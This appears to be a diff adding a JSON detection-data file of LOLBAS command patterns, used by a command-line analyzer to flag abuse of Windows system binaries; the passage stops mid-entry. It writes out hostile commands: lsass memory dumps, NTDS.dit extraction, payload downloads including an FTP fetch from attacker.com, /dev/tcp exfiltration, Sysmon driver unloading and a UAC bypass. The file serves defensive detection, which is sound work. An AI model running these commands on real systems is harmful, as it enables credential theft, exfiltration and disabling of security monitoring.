@@ -1,0 +1,2127 @@
+{
+  "_meta": {
+    "schema": "lowercased binary filename -> [{command, skeleton, category, usecase, description, mitre}]",
+    "purpose": "Layer 4 argument-pattern confirmation for core.cmdline_analyzer",
+    "source": "https://lolbas-project.github.io/api/lolbas.json",
+    "project": "https://github.com/LOLBAS-Project/LOLBAS",
+    "license": "CC BY 4.0",
+    "generated_by": "core/scripts/extract_lolbas.py",
+    "updated": "2026-08-11",
+    "binary_count": 105,
+    "command_count": 165,
+    "notes": [
+      "`skeleton` is the command with every LOLBAS placeholder ({REMOTEURL}, {PATH}, ...) and every path/URL-shaped token removed, leaving the tokens an operator cannot change while still performing the documented abuse.",
+      "Commands whose skeleton is empty are dropped: with no invariant token there is nothing to confirm, and a match on the binary name alone is already what core/data/lolbas_binaries.json reports.",
+      "Separate from lolbas_binaries.json on purpose — the Layer 2 lookup and the process module are unaffected by this file."
+    ]
+  },
+  "commands": {
+    "acccheckconsole.exe": [
+      {
+        "command": "AccCheckConsole.exe -window \"Untitled - Notepad\" {PATH_ABSOLUTE:.dll}",
+        "skeleton": [
+          "-window",
+          "untitled",
+          "notepad"
+        ],
+        "category": "Execute",
+        "usecase": "Local execution of managed code from assembly DLL.",
+        "description": "Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.",
+        "mitre": "T1218"
+      }
+    ],
+    "addinutil.exe": [
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AddinUtil.exe -AddinRoot:.",
+        "skeleton": [
+          "-addinroot:"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of malicious serialized payload",
+        "description": "AddinUtil is executed from the directory where the 'Addins.Store' payload exists, AddinUtil will execute the 'Addins.Store' payload.",
+        "mitre": "T1218"
+      }
+    ],
+    "adplus.exe": [
+      {
+        "command": "adplus.exe -hang -pn lsass.exe -o {PATH_ABSOLUTE:folder} -quiet",
+        "skeleton": [
+          "-hang",
+          "-pn",
+          "-quiet"
+        ],
+        "category": "Dump",
+        "usecase": "Create memory dump and parse it offline",
+        "description": "Creates a memory dump of the lsass process",
+        "mitre": "T1003.001"
+      },
+      {
+        "command": "adplus.exe -crash -o \"{PATH_ABSOLUTE:folder}\" -sc {PATH:.exe}",
+        "skeleton": [
+          "-crash",
+          "-sc"
+        ],
+        "category": "Execute",
+        "usecase": "Run commands under a trusted Microsoft signed binary",
+        "description": "Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.",
+        "mitre": "T1127"
+      }
+    ],
+    "advpack.dll": [
+      {
+        "command": "rundll32 advpack.dll, RegisterOCX {CMD}",
+        "skeleton": [
+          "rundll32",
+          "registerocx"
+        ],
+        "category": "Execute",
+        "usecase": "Run an executable payload.",
+        "description": "Launch command line by calling the RegisterOCX function.",
+        "mitre": "T1218.011"
+      }
+    ],
+    "agentexecutor.exe": [
+      {
+        "command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\" 0 1",
+        "skeleton": [
+          "-powershell"
+        ],
+        "category": "Execute",
+        "usecase": "Execute unsigned powershell scripts",
+        "description": "Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument",
+        "mitre": "T1218"
+      }
+    ],
+    "appcert.exe": [
+      {
+        "command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.exe} -reportoutputpath {PATH_ABSOLUTE:.xml}",
+        "skeleton": [
+          "test",
+          "-apptype",
+          "desktop",
+          "-setuppath",
+          "-reportoutputpath"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of specified file, can be used as a defense evasion",
+        "description": "Execute an executable file via the Windows App Certification Kit command-line tool.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "appcert.exe test -apptype desktop -setuppath {PATH_ABSOLUTE:.msi} -setupcommandline /q -reportoutputpath {PATH_ABSOLUTE:.xml}",
+        "skeleton": [
+          "test",
+          "-apptype",
+          "desktop",
+          "-setuppath",
+          "-setupcommandline",
+          "-reportoutputpath"
+        ],
+        "category": "Execute",
+        "usecase": "Execute custom made MSI file with malicious code",
+        "description": "Install an MSI file via an msiexec instance spawned via appcert.exe as parent process.",
+        "mitre": "T1218.007"
+      }
+    ],
+    "appvlp.exe": [
+      {
+        "command": "AppVLP.exe powershell.exe -c \"$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)\"",
+        "skeleton": [
+          "-comobject"
+        ],
+        "category": "Execute",
+        "usecase": "Local execution of process bypassing Attack Surface Reduction (ASR).",
+        "description": "Executes powershell.exe as a subprocess of AppVLP.exe and run the respective PS command.",
+        "mitre": "T1218"
+      }
+    ],
+    "at.exe": [
+      {
+        "command": "C:\\Windows\\System32\\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su {CMD}",
+        "skeleton": [
+          "/interactive",
+          "/every:"
+        ],
+        "category": "Execute",
+        "usecase": "Create a recurring task, to eg. to keep reverse shell session(s) alive",
+        "description": "Create a recurring task to execute every day at a specific time.",
+        "mitre": "T1053.002"
+      }
+    ],
+    "atbroker.exe": [
+      {
+        "command": "ATBroker.exe /start malware",
+        "skeleton": [
+          "/start",
+          "malware"
+        ],
+        "category": "Execute",
+        "usecase": "Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistive Technology (AT) service entry.",
+        "description": "Start a registered Assistive Technology (AT).",
+        "mitre": "T1218"
+      }
+    ],
+    "bash.exe": [
+      {
+        "command": "bash.exe -c 'cat {PATH:.zip} > /dev/tcp/192.168.1.10/24'",
+        "skeleton": [
+          "/dev/tcp/192.168.1.10/24"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of specified file, can be used as a defensive evasion.",
+        "description": "Exfiltrate data",
+        "mitre": "T1202"
+      }
+    ],
+    "bcp.exe": [
+      {
+        "command": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c",
+        "skeleton": [
+          "select",
+          "from",
+          "where",
+          "queryout",
+          "localhost"
+        ],
+        "category": "Download",
+        "usecase": "Extract malicious executable from database storage to local file system for execution.",
+        "description": "Export binary payload stored in SQL Server database to file system.",
+        "mitre": "T1105"
+      }
+    ],
+    "bginfo.exe": [
+      {
+        "command": "bginfo.exe {PATH:.bgi} /popup /nolicprompt",
+        "skeleton": [
+          "/popup",
+          "/nolicprompt"
+        ],
+        "category": "Execute",
+        "usecase": "Local execution of VBScript",
+        "description": "Execute VBscript code that is referenced within the specified .bgi file.",
+        "mitre": "T1218"
+      }
+    ],
+    "bitsadmin.exe": [
+      {
+        "command": "bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1",
+        "skeleton": [
+          "/create",
+          "/addfile",
+          "/setnotifycmdline",
+          "null",
+          "/resume",
+          "/complete"
+        ],
+        "category": "ADS",
+        "usecase": "Performs execution of specified file in the alternate data stream, can be used as a defensive evasion or persistence technique.",
+        "description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command from an Alternate data stream, then resume and complete the job.",
+        "mitre": "T1564.004"
+      },
+      {
+        "command": "bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1",
+        "skeleton": [
+          "/create",
+          "/addfile",
+          "/resume",
+          "/complete"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Create a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset",
+        "skeleton": [
+          "/create",
+          "/addfile",
+          "/resume",
+          "/complete",
+          "/reset"
+        ],
+        "category": "Copy",
+        "usecase": "Copy file",
+        "description": "Command for copying cmd.exe to another folder",
+        "mitre": "T1105"
+      },
+      {
+        "command": "bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset",
+        "skeleton": [
+          "/create",
+          "/addfile",
+          "/setnotifycmdline",
+          "null",
+          "/resume",
+          "/reset"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary file specified. Can be used as a defensive evasion.",
+        "description": "One-liner that creates a bitsadmin job named 1, add cmd.exe to the job, configure the job to run the target command, then resume and complete the job.",
+        "mitre": "T1218"
+      }
+    ],
+    "cdb.exe": [
+      {
+        "command": "cdb.exe -cf {PATH:.wds} -o notepad.exe",
+        "skeleton": [
+          "-cf"
+        ],
+        "category": "Execute",
+        "usecase": "Local execution of assembly shellcode.",
+        "description": "Launch 64-bit shellcode from the specified .wds file using cdb.exe.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "cdb.exe -pd -pn {process_name}\n.shell {CMD}",
+        "skeleton": [
+          "-pd",
+          "-pn"
+        ],
+        "category": "Execute",
+        "usecase": "Run a shell command under a trusted Microsoft signed binary",
+        "description": "Attaching to any process and executing shell commands.",
+        "mitre": "T1127"
+      }
+    ],
+    "certoc.exe": [
+      {
+        "command": "certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}",
+        "skeleton": [
+          "-loaddll"
+        ],
+        "category": "Execute",
+        "usecase": "Execute code within DLL file",
+        "description": "Loads the target DLL file",
+        "mitre": "T1218"
+      },
+      {
+        "command": "certoc.exe -GetCACAPS {REMOTEURL:.ps1}",
+        "skeleton": [
+          "-getcacaps"
+        ],
+        "category": "Download",
+        "usecase": "Download scripts, webshells etc.",
+        "description": "Downloads text formatted files",
+        "mitre": "T1105"
+      }
+    ],
+    "certreq.exe": [
+      {
+        "command": "CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}",
+        "skeleton": [
+          "-post",
+          "-config"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).",
+        "mitre": "T1105"
+      }
+    ],
+    "certutil.exe": [
+      {
+        "command": "certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}",
+        "skeleton": [
+          "-urlcache"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Download and save an executable to disk in the current folder.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}",
+        "skeleton": [
+          "-verifyctl"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Download and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>` when not.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "certutil.exe -URL {REMOTEURL:.exe}",
+        "skeleton": [
+          "-url"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Download and save an executable to `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>`.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "certutil -encode {PATH} {PATH:.base64}",
+        "skeleton": [
+          "-encode"
+        ],
+        "category": "Encode",
+        "usecase": "Encode files to evade defensive measures",
+        "description": "Command to encode a file using Base64",
+        "mitre": "T1027.013"
+      },
+      {
+        "command": "certutil -decode {PATH:.base64} {PATH}",
+        "skeleton": [
+          "-decode"
+        ],
+        "category": "Decode",
+        "usecase": "Decode files to evade defensive measures",
+        "description": "Command to decode a Base64 encoded file.",
+        "mitre": "T1140"
+      },
+      {
+        "command": "certutil -decodehex {PATH:.hex} {PATH}",
+        "skeleton": [
+          "-decodehex"
+        ],
+        "category": "Decode",
+        "usecase": "Decode files to evade defensive measures",
+        "description": "Command to decode a hexadecimal-encoded file.",
+        "mitre": "T1140"
+      }
+    ],
+    "cipher.exe": [
+      {
+        "command": "cipher /w:{PATH_ABSOLUTE:folder}",
+        "skeleton": [
+          "/w:"
+        ],
+        "category": "Tamper",
+        "usecase": "Can be used to forensically erase a file.",
+        "description": "Zero out a file",
+        "mitre": "T1485"
+      }
+    ],
+    "cl_loadassembly.ps1": [
+      {
+        "command": "powershell.exe -ep bypass -command \"set-location -path C:\\Windows\\diagnostics\\system\\Audio; import-module .\\CL_LoadAssembly.ps1; LoadAssemblyFromPath ..\\..\\..\\..\\testing\\fun.dll;[Program]::Fun()\"",
+        "skeleton": [
+          "-ep",
+          "bypass",
+          "-command",
+          "-path",
+          "loadassemblyfrompath"
+        ],
+        "category": "Execute",
+        "usecase": "Execute proxied payload with Microsoft signed binary",
+        "description": "Proxy execute Managed DLL with PowerShell",
+        "mitre": "T1216"
+      }
+    ],
+    "cmdkey.exe": [
+      {
+        "command": "cmdkey /list",
+        "skeleton": [
+          "/list"
+        ],
+        "category": "Credentials",
+        "usecase": "Get credential information from host",
+        "description": "List cached credentials",
+        "mitre": "T1078"
+      }
+    ],
+    "cmdl32.exe": [
+      {
+        "command": "cmdl32 /vpn /lan %cd%\\config",
+        "skeleton": [
+          "/vpn",
+          "/lan"
+        ],
+        "category": "Download",
+        "usecase": "Download file from Internet",
+        "description": "Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where \"X\" denotes a random number or letter.",
+        "mitre": "T1105"
+      }
+    ],
+    "cmstp.exe": [
+      {
+        "command": "cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}",
+        "skeleton": [
+          "/ni"
+        ],
+        "category": "Execute",
+        "usecase": "Execute code hidden within an inf file. Download and run scriptlets from internet.",
+        "description": "Silently installs a specially formatted local .INF without creating a desktop icon. The .INF file contains a UnRegisterOCXSection section which executes a .SCT file using scrobj.dll.",
+        "mitre": "T1218.003"
+      },
+      {
+        "command": "cmstp.exe /nf",
+        "skeleton": [
+          "/nf"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of a malicious DLL via registry modification.",
+        "description": "cmstp.exe reads the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\cmmgr32.exe\\CmstpExtensionDll` registry value and passes its data directly to `LoadLibrary`. By modifying this registry key and setting it to an attack-controlled DLL, this will sideload the DLL via `cmstp.exe`.",
+        "mitre": "T1218.003"
+      }
+    ],
+    "comsvcs.dll": [
+      {
+        "command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full",
+        "skeleton": [
+          "rundll32",
+          "minidump",
+          "full"
+        ],
+        "category": "Dump",
+        "usecase": "Dump Lsass.exe process memory to retrieve credentials.",
+        "description": "Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.",
+        "mitre": "T1003.001"
+      }
+    ],
+    "conhost.exe": [
+      {
+        "command": "conhost.exe --headless {CMD}",
+        "skeleton": [
+          "--headless"
+        ],
+        "category": "Execute",
+        "usecase": "Specify --headless parameter to hide child process window (if applicable)",
+        "description": "Execute a command line with conhost.exe as parent process",
+        "mitre": "T1202"
+      }
+    ],
+    "csc.exe": [
+      {
+        "command": "csc.exe -out:{PATH:.exe} {PATH:.cs}",
+        "skeleton": [
+          "-out:"
+        ],
+        "category": "Compile",
+        "usecase": "Compile attacker code on system. Bypass defensive counter measures.",
+        "description": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to the specified .exe path.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "csc -target:library {PATH:.cs}",
+        "skeleton": [
+          "-target:"
+        ],
+        "category": "Compile",
+        "usecase": "Compile attacker code on system. Bypass defensive counter measures.",
+        "description": "Use csc.exe to compile C# code, targeting the .NET Framework, stored in the specified .cs file and output the compiled version to a DLL file with the same name.",
+        "mitre": "T1127"
+      }
+    ],
+    "cscript.exe": [
+      {
+        "command": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs",
+        "skeleton": [
+          "//e:"
+        ],
+        "category": "ADS",
+        "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
+        "description": "Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).",
+        "mitre": "T1564.004"
+      }
+    ],
+    "datasvcutil.exe": [
+      {
+        "command": "DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}",
+        "skeleton": [
+          "/out:",
+          "/uri:"
+        ],
+        "category": "Upload",
+        "usecase": "Upload file",
+        "description": "Upload file, credentials or data exfiltration in general",
+        "mitre": "T1567"
+      }
+    ],
+    "defaultpack.exe": [
+      {
+        "command": "DefaultPack.EXE /C:\"{CMD}\"",
+        "skeleton": [
+          "/c:"
+        ],
+        "category": "Execute",
+        "usecase": "Can be used to execute stagers, binaries, and other malicious commands.",
+        "description": "Use DefaultPack.EXE to execute arbitrary binaries, with added argument support.",
+        "mitre": "T1218"
+      }
+    ],
+    "desktopimgdownldr.exe": [
+      {
+        "command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr",
+        "skeleton": [
+          "/lockscreenurl:",
+          "/eventname:"
+        ],
+        "category": "Download",
+        "usecase": "Download arbitrary files from a web server",
+        "description": "Downloads the file and sets it as the computer's lockscreen",
+        "mitre": "T1105"
+      }
+    ],
+    "devtoolslauncher.exe": [
+      {
+        "command": "devtoolslauncher.exe LaunchForDeploy {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
+        "skeleton": [
+          "launchfordeploy",
+          "test"
+        ],
+        "category": "Execute",
+        "usecase": "Execute any binary with given arguments and it will call `developertoolssvc.exe`. `developertoolssvc` is actually executing the binary.",
+        "description": "The above binary will execute other binary.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "devtoolslauncher.exe LaunchForDebug {PATH_ABSOLUTE:.exe} \"{CMD:args}\" test",
+        "skeleton": [
+          "launchfordebug",
+          "test"
+        ],
+        "category": "Execute",
+        "usecase": "Execute any binary with given arguments.",
+        "description": "The above binary will execute other binary.",
+        "mitre": "T1127"
+      }
+    ],
+    "dnscmd.exe": [
+      {
+        "command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}",
+        "skeleton": [
+          "/config",
+          "/serverlevelplugindll"
+        ],
+        "category": "Execute",
+        "usecase": "Remotely inject dll to dns server",
+        "description": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.",
+        "mitre": "T1543.003"
+      }
+    ],
+    "dsdbutil.exe": [
+      {
+        "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"quit\" \"quit\"",
+        "skeleton": [
+          "activate",
+          "instance",
+          "ntds",
+          "snapshot",
+          "create",
+          "quit"
+        ],
+        "category": "Dump",
+        "usecase": "Snapshoting of Active Directory NTDS.dit database",
+        "description": "dsdbutil supports VSS snapshot creation",
+        "mitre": "T1003.003"
+      },
+      {
+        "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"mount {GUID}\" \"quit\" \"quit\"",
+        "skeleton": [
+          "activate",
+          "instance",
+          "ntds",
+          "snapshot",
+          "mount",
+          "quit"
+        ],
+        "category": "Dump",
+        "usecase": "Mounting the snapshot to access the ntds.dit with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`",
+        "description": "Mounting the snapshot with its GUID",
+        "mitre": "T1003.003"
+      },
+      {
+        "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"delete {GUID}\" \"quit\" \"quit\"",
+        "skeleton": [
+          "activate",
+          "instance",
+          "ntds",
+          "snapshot",
+          "delete",
+          "quit"
+        ],
+        "category": "Dump",
+        "usecase": "Deletes the snapshot",
+        "description": "Deletes the mount of the snapshot",
+        "mitre": "T1003.003"
+      },
+      {
+        "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"create\" \"list all\" \"mount 1\" \"quit\" \"quit\"",
+        "skeleton": [
+          "activate",
+          "instance",
+          "ntds",
+          "snapshot",
+          "create",
+          "list",
+          "mount",
+          "quit"
+        ],
+        "category": "Dump",
+        "usecase": "Mounting the snapshot identifier 1 and accessing it with `copy c:\\<Snap Volume>\\windows\\ntds\\ntds.dit c:\\users\\administrator\\desktop\\ntds.dit.bak`",
+        "description": "Mounting with snapshot identifier",
+        "mitre": "T1003.003"
+      },
+      {
+        "command": "dsdbutil.exe \"activate instance ntds\" \"snapshot\" \"list all\" \"delete 1\" \"quit\" \"quit\"",
+        "skeleton": [
+          "activate",
+          "instance",
+          "ntds",
+          "snapshot",
+          "list",
+          "delete",
+          "quit"
+        ],
+        "category": "Dump",
+        "usecase": "deletes the snapshot",
+        "description": "Deletes the mount of the snapshot",
+        "mitre": "T1003.003"
+      }
+    ],
+    "dtutil.exe": [
+      {
+        "command": "dtutil.exe /FILE {PATH_ABSOLUTE:.source.ext} /COPY FILE;{PATH_ABSOLUTE:.dest.ext}",
+        "skeleton": [
+          "/file",
+          "/copy"
+        ],
+        "category": "Copy",
+        "usecase": "Use to copies the source file to the destination file",
+        "description": "Copy file from source to destination",
+        "mitre": "T1105"
+      }
+    ],
+    "dumpminitool.exe": [
+      {
+        "command": "DumpMinitool.exe --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full",
+        "skeleton": [
+          "--file",
+          "--processid",
+          "--dumptype",
+          "full"
+        ],
+        "category": "Dump",
+        "usecase": "Create memory dump and parse it offline",
+        "description": "Creates a memory dump of the lsass process",
+        "mitre": "T1003.001"
+      }
+    ],
+    "dxcap.exe": [
+      {
+        "command": "dxcap.exe -usage",
+        "skeleton": [
+          "-usage"
+        ],
+        "category": "Execute",
+        "usecase": "Execute an arbitrary executable via trusted system executable.",
+        "description": "Once executed, `dxcap.exe` will execute `xperf.exe` in the same folder. Thus, if `dxcap.exe` is copied to a folder and an arbitrary executable is renamed to `xperf.exe`, `dxcap.exe` will spawn it.",
+        "mitre": "T1127"
+      }
+    ],
+    "esentutl.exe": [
+      {
+        "command": "esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d {PATH_ABSOLUTE:.dit}",
+        "skeleton": [
+          "/vss"
+        ],
+        "category": "Copy",
+        "usecase": "Copy/extract a locked file such as the AD Database",
+        "description": "Copies a (locked) file using Volume Shadow Copy",
+        "mitre": "T1003.003"
+      }
+    ],
+    "eventvwr.exe": [
+      {
+        "command": "ysoserial.exe -o raw -f BinaryFormatter - g DataSet -c \"{CMD}\" > RecentViews & copy RecentViews %LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews & eventvwr.exe",
+        "skeleton": [
+          "binaryformatter",
+          "dataset",
+          "recentviews",
+          "copy"
+        ],
+        "category": "UAC Bypass",
+        "usecase": "Execute a command to bypass security restrictions that limit the use of command-line interpreters.",
+        "description": "During startup, eventvwr.exe uses .NET deserialization with `%LOCALAPPDATA%\\Microsoft\\EventV~1\\RecentViews` file. This file can be created using https://github.com/pwntester/ysoserial.net",
+        "mitre": "T1548.002"
+      }
+    ],
+    "explorer.exe": [
+      {
+        "command": "explorer.exe /root,\"{PATH_ABSOLUTE:.exe}\"",
+        "skeleton": [
+          "/root"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of specified file with explorer parent process breaking the process tree, can be used for defense evasion.",
+        "description": "Execute specified .exe with the parent process spawning from a new instance of explorer.exe",
+        "mitre": "T1202"
+      }
+    ],
+    "fltmc.exe": [
+      {
+        "command": "fltMC.exe unload SysmonDrv",
+        "skeleton": [
+          "unload",
+          "sysmondrv"
+        ],
+        "category": "Tamper",
+        "usecase": "Defense evasion",
+        "description": "Unloads a driver used by security agents",
+        "mitre": "T1562.001"
+      }
+    ],
+    "fsutil.exe": [
+      {
+        "command": "fsutil.exe file setZeroData offset=0 length=9999999999 {PATH_ABSOLUTE}",
+        "skeleton": [
+          "file",
+          "setzerodata"
+        ],
+        "category": "Tamper",
+        "usecase": "Can be used to forensically erase a file",
+        "description": "Zero out a file",
+        "mitre": "T1485"
+      },
+      {
+        "command": "fsutil.exe trace decode",
+        "skeleton": [
+          "trace",
+          "decode"
+        ],
+        "category": "Execute",
+        "usecase": "Spawn a pre-planted executable from fsutil.exe.",
+        "description": "Executes a pre-planted binary named netsh.exe from the current directory.",
+        "mitre": "T1218"
+      }
+    ],
+    "ftp.exe": [
+      {
+        "command": "echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt",
+        "skeleton": [
+          "echo",
+          "-s:"
+        ],
+        "category": "Execute",
+        "usecase": "Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand",
+        "description": "Executes the commands you put inside the text file.",
+        "mitre": "T1202"
+      },
+      {
+        "command": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"",
+        "skeleton": [
+          "open",
+          "user",
+          "pass",
+          "/payload.exe>>ftp.txt&@echo",
+          "-s:"
+        ],
+        "category": "Download",
+        "usecase": "Spawn new process using ftp.exe. Ftp.exe downloads the binary.",
+        "description": "Download",
+        "mitre": "T1105"
+      }
+    ],
+    "gpscript.exe": [
+      {
+        "command": "Gpscript /logon",
+        "skeleton": [
+          "/logon"
+        ],
+        "category": "Execute",
+        "usecase": "Add local group policy logon script to execute file and hide from defensive counter measures",
+        "description": "Executes logon scripts configured in Group Policy.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "Gpscript /startup",
+        "skeleton": [
+          "/startup"
+        ],
+        "category": "Execute",
+        "usecase": "Add local group policy logon script to execute file and hide from defensive counter measures",
+        "description": "Executes startup scripts configured in Group Policy",
+        "mitre": "T1218"
+      }
+    ],
+    "ie4uinit.exe": [
+      {
+        "command": "ie4uinit.exe -BaseSettings",
+        "skeleton": [
+          "-basesettings"
+        ],
+        "category": "Execute",
+        "usecase": "Get code execution by copy files to another location",
+        "description": "Executes commands from a specially prepared ie4uinit.inf file.",
+        "mitre": "T1218"
+      }
+    ],
+    "ieadvpack.dll": [
+      {
+        "command": "rundll32 ieadvpack.dll, RegisterOCX {CMD}",
+        "skeleton": [
+          "rundll32",
+          "registerocx"
+        ],
+        "category": "Execute",
+        "usecase": "Run an executable payload.",
+        "description": "Launch command line by calling the RegisterOCX function.",
+        "mitre": "T1218.011"
+      }
+    ],
+    "iediagcmd.exe": [
+      {
+        "command": "set windir=c:\\test& cd \"C:\\Program Files\\Internet Explorer\\\" & iediagcmd.exe /out:{PATH_ABSOLUTE:.cab}",
+        "skeleton": [
+          "/out:"
+        ],
+        "category": "Execute",
+        "usecase": "Spawn a pre-planted executable from iediagcmd.exe.",
+        "description": "Executes binary that is pre-planted at C:\\test\\system32\\netsh.exe.",
+        "mitre": "T1218"
+      }
+    ],
+    "ilasm.exe": [
+      {
+        "command": "ilasm.exe {PATH_ABSOLUTE:.txt} /exe",
+        "skeleton": [
+          "/exe"
+        ],
+        "category": "Compile",
+        "usecase": "Compile attacker code on system. Bypass defensive counter measures.",
+        "description": "Binary file used by .NET to compile C#/intermediate (IL) code to .exe",
+        "mitre": "T1127"
+      },
+      {
+        "command": "ilasm.exe {PATH_ABSOLUTE:.txt} /dll",
+        "skeleton": [
+          "/dll"
+        ],
+        "category": "Compile",
+        "usecase": "A description of the usecase",
+        "description": "Binary file used by .NET to compile C#/intermediate (IL) code to dll",
+        "mitre": "T1127"
+      }
+    ],
+    "installutil.exe": [
+      {
+        "command": "InstallUtil.exe /logfile= /LogToConsole=false /U {PATH:.dll}",
+        "skeleton": [
+          "/logfile=",
+          "/logtoconsole=false"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Use to execute code and bypass application whitelisting",
+        "description": "Execute the target .NET DLL or EXE.",
+        "mitre": "T1218.004"
+      }
+    ],
+    "intellitrace.exe": [
+      {
+        "command": "IntelliTrace.exe launch /cp:\"collectionplan.xml\" /f:\"c:\\users\\public\\log\" \"C:\\Windows\\System32\\calc.exe\"",
+        "skeleton": [
+          "launch",
+          "/cp:"
+        ],
+        "category": "Execute",
+        "usecase": "Executes an executable under a trusted microsoft signed binary.",
+        "description": "Launches an executable via Visual Studio command line utility.",
+        "mitre": "T1127"
+      }
+    ],
+    "jsc.exe": [
+      {
+        "command": "jsc.exe /t:library {PATH:.js}",
+        "skeleton": [
+          "/t:"
+        ],
+        "category": "Compile",
+        "usecase": "Compile attacker code on system. Bypass defensive counter measures.",
+        "description": "Use jsc.exe to compile JavaScript code stored in the .JS file and generate a DLL file with the same name.",
+        "mitre": "T1127"
+      }
+    ],
+    "launch-vsdevshell.ps1": [
+      {
+        "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsWherePath {PATH_ABSOLUTE:.exe}",
+        "skeleton": [
+          "powershell",
+          "-ep",
+          "remotesigned",
+          "-vswherepath"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution",
+        "description": "Execute binaries from the context of the signed script using the \"VsWherePath\" flag.",
+        "mitre": "T1216"
+      },
+      {
